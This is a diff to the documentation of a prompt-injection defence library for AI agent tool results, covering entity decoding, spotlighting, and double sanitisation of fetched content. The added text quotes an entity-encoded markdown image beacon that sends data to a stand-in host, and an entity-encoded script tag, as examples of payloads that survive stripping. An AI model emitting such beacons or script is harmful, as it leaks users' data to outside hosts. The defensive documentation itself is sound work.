@@ -246,9 +246,12 @@ Two options are worth understanding rather than copying:
 - **`decodeEntities: false`** is for a channel whose consumer does not itself
   decode HTML entities. The decode's result is what gets *returned*, so on such
   a channel it turns inert bytes the origin sent (`&#x3c;script&#x3e;`) into
-  live markup this library authored. The cost of switching it off is stated in
-  `ARCHITECTURE.md` invariant 1a: the re-detect can no longer unmask an
-  entity-encoded injection phrase on that channel.
+  live markup this library authored. **What it costs is real and worth weighing:
+  an entity-encoded beacon or `<script>` block survives the strip on that
+  channel**, not merely the detection log — `![x](&#104;ttps://host/?d=…)` is
+  returned intact, and a consumer that does decode entity references will
+  honour it. Set it to `false` only when you know your consumer does not decode.
+  `ARCHITECTURE.md` invariant 1a states the trade in full.
 
 `applySpotlighting` is idempotent — if the framework re-wraps content that
 your custom tool already wrapped, the outer call is a no-op.
@@ -296,12 +299,17 @@ part the wrap runs:
 received it. Pre-defending is harmless but redundant; `applySpotlighting` is
 idempotent and the sanitiser is idempotent on already-sanitised text.
 
-Two exceptions keep their own, better-informed pass: `curl_execute` and
-`jq_query` already ran `defendText` under the Content-Type the origin actually
-declared, and mark their successful results so the wrap does not second-guess
-that with a grammar it can no longer see. Their *error* results are not marked
-— error text carries exception messages that can embed foreign bytes — so those
-take the full pipeline like any other unknown text.
+`curl_execute` and `jq_query` results pass through the wrap too, so their text
+is defended twice: once inside the tool under the Content-Type the origin
+actually declared, and again at the wrap under the strictest grammar. That is
+deliberate defence-in-depth, not an oversight — the second pass is the
+less-informed one, and it is additive because every strip stage is idempotent.
+
+One visible consequence: a JSON body is exempt from the strip stages on the
+*persisted* copy (`save_to_file` writes what the origin sent, so `jq_query` can
+read it back) but not on the copy returned inline to the model, which the wrap
+strips like any other text. Persisted keeps the exemption; returned does not.
+See `ARCHITECTURE.md` invariant 1a.
 
 Idempotence for the wrap as a whole is enforced via a module-private symbol tag,
 so a result passing through two wraps is not processed twice. The wrap is
